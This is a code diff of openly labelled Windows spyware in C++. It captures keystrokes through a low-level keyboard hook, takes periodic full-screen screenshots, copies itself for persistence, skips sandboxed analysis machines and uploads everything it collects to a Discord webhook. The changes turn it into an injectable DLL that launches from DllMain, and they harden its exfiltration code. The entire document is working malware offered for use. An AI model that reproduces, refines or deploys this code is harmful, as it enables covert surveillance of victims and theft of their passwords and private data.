@@ -7,9 +7,6 @@
 #include <gdiplus.h>
 #include <iostream>
 #include <fstream>
-extern "C"{
-    #include "ReflectiveLoader.h"
-}
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "gdiplus.lib")
@@ -51,8 +48,12 @@ std::string getTargetDir() {
 
 // =============== PERSISTENCE ===============
 void installSelf() {
-    char exePath[MAX_PATH], targetPath[MAX_PATH];
+    char exePath[MAX_PATH];
     GetModuleFileNameA(NULL, exePath, sizeof(exePath));
+    // Skip persistence if running as a DLL (injected context)
+    if (strstr(exePath, ".dll") != NULL) return;
+
+    char targetPath[MAX_PATH];
     sprintf_s(targetPath, "%slogger.exe", getTargetDir().c_str());
     CopyFileA(exePath, targetPath, FALSE);
 
@@ -68,20 +69,50 @@ void installSelf() {
     }
 }
 
+// =============== URL ENCODE ===============
+std::string url_encode(const std::string &value) {
+    std::string encoded;
+    for (char c : value) {
+        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
+            encoded += c;
+        } else {
+            char buf[4];
+            sprintf_s(buf, "%%%02X", (unsigned char)c);
+            encoded += buf;
+        }
+    }
+    return encoded;
+}
+
 // =============== DISCORD TEXT ===============
 void send_to_discord_text(const char* msg) {
     HINTERNET hInt = InternetOpenA("discord", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (!hInt) return;
+    if (!hInt) {
+        OutputDebugStringA("Failed to open internet handle\n");
+        return;
+    }
     HINTERNET hConn = InternetConnectA(hInt, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConn) { InternetCloseHandle(hInt); return; }
+    if (!hConn) {
+        OutputDebugStringA("Failed to connect to discord.com\n");
+        InternetCloseHandle(hInt);
+        return;
+    }
 
     HINTERNET hReq = HttpOpenRequestA(hConn, "POST", WEBHOOK_URL, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
-    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInt); return; }
+    if (!hReq) {
+        OutputDebugStringA("Failed to open HTTP request\n");
+        InternetCloseHandle(hConn);
+        InternetCloseHandle(hInt);
+        return;
+    }
 
-    char data[2048];
-    sprintf_s(data, "content=%s", msg);
+    std::string encoded_msg = url_encode(msg);
+    char data[4096];
+    sprintf_s(data, "content=%s", encoded_msg.c_str());
     const char* headers = "Content-Type: application/x-www-form-urlencoded\r\n";
-    HttpSendRequestA(hReq, headers, -1, data, strlen(data));
+    if (!HttpSendRequestA(hReq, headers, -1, data, strlen(data))) {
+        OutputDebugStringA("Failed to send HTTP request\n");
+    }
 
     InternetCloseHandle(hReq);
     InternetCloseHandle(hConn);
@@ -106,13 +137,32 @@ void send_to_discord_file(const char* filename, BYTE* data, DWORD size) {
     memcpy(payload + pos, tail, strlen(tail)); pos += strlen(tail);
 
     HINTERNET hInt = InternetOpenA("discord-upload", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (!hInt) { delete[] payload; return; }
+    if (!hInt) {
+        OutputDebugStringA("Failed to open internet handle for file upload\n");
+        delete[] payload;
+        return;
+    }
     HINTERNET hConn = InternetConnectA(hInt, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConn) {
+        OutputDebugStringA("Failed to connect to discord.com for file upload\n");
+        InternetCloseHandle(hInt);
+        delete[] payload;
+        return;
+    }
     HINTERNET hReq = HttpOpenRequestA(hConn, "POST", WEBHOOK_URL, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+    if (!hReq) {
+        OutputDebugStringA("Failed to open HTTP request for file upload\n");
+        InternetCloseHandle(hConn);
+        InternetCloseHandle(hInt);
+        delete[] payload;
+        return;
+    }
 
     char hdrs[256];
     sprintf_s(hdrs, "Content-Type: multipart/form-data; boundary=%s", boundary);
-    HttpSendRequestA(hReq, hdrs, strlen(hdrs), payload, pos);
+    if (!HttpSendRequestA(hReq, hdrs, strlen(hdrs), payload, pos)) {
+        OutputDebugStringA("Failed to send HTTP request for file upload\n");
+    }
 
     InternetCloseHandle(hReq);
     InternetCloseHandle(hConn);
@@ -147,7 +197,7 @@ DWORD WINAPI screenshot_thread(LPVOID) {
         int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 
         char dbg[128];
-        sprintf_s(dbg, "📸 Full Screen: x=%d y=%d w=%d h=%d", x, y, w, h);
+        sprintf_s(dbg, "Screenshot: x=%d y=%d w=%d h=%d", x, y, w, h);
         send_to_discord_text(dbg);
 
         HDC hdc = GetDC(NULL);
@@ -233,6 +283,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (vk >= 'A' && vk <= 'Z') {
             sprintf_s(key, "%c", (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? vk : vk + 32);
         }
+        else if (vk>='a' && vk<='z'){
+            sprintf_s(key, "%c", (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? vk - 32 : vk);
+        }
         else if (vk >= '0' && vk <= '9') {
             sprintf_s(key, "%c", vk);
         }
@@ -271,10 +324,10 @@ BOOL isSandboxed() {
     return u && (!strcmp(u, "sandbox") || !strcmp(u, "maltest"));
 }
 
-DWORD WINAPI MyMainThread(LPVOID lpParam) {
+void InitializeMalware(HMODULE hModule) {
     enableDPIAwareness();
 
-    if (!ensure_single_instance() || isSandboxed()) return 0;
+    if (!ensure_single_instance() || isSandboxed()) return;
 
     GdiplusStartupInput gdiplusStartupInput;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
@@ -286,19 +339,36 @@ DWORD WINAPI MyMainThread(LPVOID lpParam) {
     CreateThread(NULL, 0, screenshot_thread, NULL, 0, NULL);
     CreateThread(NULL, 0, keylog_flush_thread, NULL, 0, NULL);
 
-    keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleA(NULL), 0);
-    if (!keyboardHook) return 0;
+    keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, hModule, 0);
+    if (!keyboardHook) {
+        send_to_discord_text("Failed to set keyboard hook");
+    } else {
+        send_to_discord_text("Keyboard hook set successfully");
+    }
 
+    // Send initial test message
+    send_to_discord_text("Malware initialized in target process");
+}
+
+// Thread function to initialize malware
+DWORD WINAPI MyMainThread(LPVOID lpParameter) {
+    HMODULE hModule = (HMODULE)lpParameter;
+    InitializeMalware(hModule);
+    
+    // Message loop to keep the hook alive
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
-
-    UnhookWindowsHookEx(keyboardHook);
-    GdiplusShutdown(gdiplusToken);
-    DeleteCriticalSection(&keylog_lock);
     return 0;
 }
-// Dummy export to make linker happy
-extern "C" __declspec(dllexport) void dummy() {}
+
+// DLL Entry Point
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        // Start the main functionality in a new thread
+        CreateThread(NULL, 0, MyMainThread, hModule, 0, NULL);
+    }
+    return TRUE;
+}
